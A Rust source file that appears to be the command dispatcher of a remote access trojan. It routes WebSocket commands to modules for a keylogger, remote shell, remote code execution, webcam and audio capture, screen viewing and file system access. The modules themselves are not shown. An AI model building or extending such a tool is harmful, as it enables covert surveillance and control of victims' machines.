use crate::actors::{self, Command, WsMessageSender};

use serde::Deserialize;

#[derive(Deserialize)]
pub struct CommandMessage {
    pub module: String, // Module name
    // `args` is different for each module, so `serde_json::Value` is used
    // This allows us to postpone argument parsing until a specific handler is called.
    pub args: serde_json::Value,
}

use std::collections::HashMap;
use tokio::sync::mpsc;

macro_rules! register {
    ($senders:expr, $writer:expr, $(($name:literal, $type:ty)),+ ) => {
        $(
            {
                let (tx, rx) = mpsc::channel(32);
                $senders.insert($name.to_string(), tx);
                crate::actors::run_actor::<$type>(rx, $writer.clone());
            }
        )+
    };
}

pub struct Dispatcher {
    senders: HashMap<String, mpsc::Sender<Command>>,
}

impl Dispatcher {
    pub fn new(writer: WsMessageSender) -> Self {
        let mut senders = HashMap::new();

        register!(
            senders,
            writer,
            ("AD", actors::audio::Audio),
            ("FS", actors::file_system::FileSystem),
            ("RSH", actors::remote_cmd::RemoteCMD),
            ("KL", actors::keylogger::KeyLogger),
            ("RS", actors::remote_screen::RemoteScreen),
            ("RCE", actors::remote_code_execution::RemoteCodeExecution),
            ("TM", actors::task_manager::TaskManager),
            ("TRL", actors::trolling::Trolling),
            ("WC", actors::webcam::Webcam),
            ("CH", actors::chat::Chat)
        );

        Self { senders }
    }

    pub async fn dispatch(&self, msg: CommandMessage) -> anyhow::Result<()> {
        if let Some(sender) = self.senders.get(&msg.module) {
            sender.send(msg.args).await.map_err(|e| {
                anyhow::anyhow!("Failed to send command to actor {}: {}", msg.module, e)
            })
        } else {
            Err(anyhow::anyhow!(
                "No actor registered for module {}",
                msg.module
            ))
        }
    }
}
